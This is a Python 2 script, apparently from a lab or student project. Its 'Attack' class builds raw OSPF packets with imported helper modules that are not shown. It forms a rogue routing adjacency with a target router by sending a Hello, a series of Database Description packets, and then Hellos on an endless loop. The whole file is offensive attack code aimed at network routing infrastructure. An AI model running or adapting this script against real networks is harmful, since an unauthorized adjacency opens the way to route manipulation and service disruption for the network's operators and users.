from time import sleep
from Commom.Utils import *
from Commom.PacketBuilder import *
from Commom.Socket import *
from Commom.ConnectionInfo import *
from Commom.Packet import *


class Attack:
    def __init__(self):
        self.socket = Socket()

    def start_attack(self):

        # Establish connection with Hello
        print 'Initiating adjacency\n'
        self.send_hello()

        print 'Database Sync started\n'
        # Send some DBD packets to complete connection
        self.send_database_description()
        print 'Database Sync complete\n'
        print 'Adjacency complete\n'
        print 'Keep Alive timer started\n'
        # Send keep alive after some timne
        self.keep_alive()

    def build_packet(self, strategy):
        builder = PacketBuilder()
        builder.build_Eth(to_mac_str(SRC_MAC), to_mac_str(DST_MAC))
        builder.build_Ip4(to_net_addr(SRC_IP), to_net_addr(DST_IP))
        builder.build_Ospf()
        strategy(builder)
        builder.buid_Length()
        builder.calculate_checksum()
        return builder

    def send_hello(self):
        builder = self.build_packet(lambda b: b.build_Hello())
        self.send(builder)

    def send_database_description(self):
        sequence = SEQUENCE_START
        init = True
        for i in range(0, 5):
            builder = self.build_packet(lambda b: b.build_DBD(sequence, init))
            self.send(builder)
            sequence += 1
            init = False
            sleep(0.3)

    def keep_alive(self):
        while True:
            self.send_hello()
            sleep(HELLO_INTERVAL)

    def send(self, builder):
        self.socket.send(builder.pack())


if __name__ == "__main__":
    try:
        Attack().start_attack()
    finally:
        print 'Application ended.'
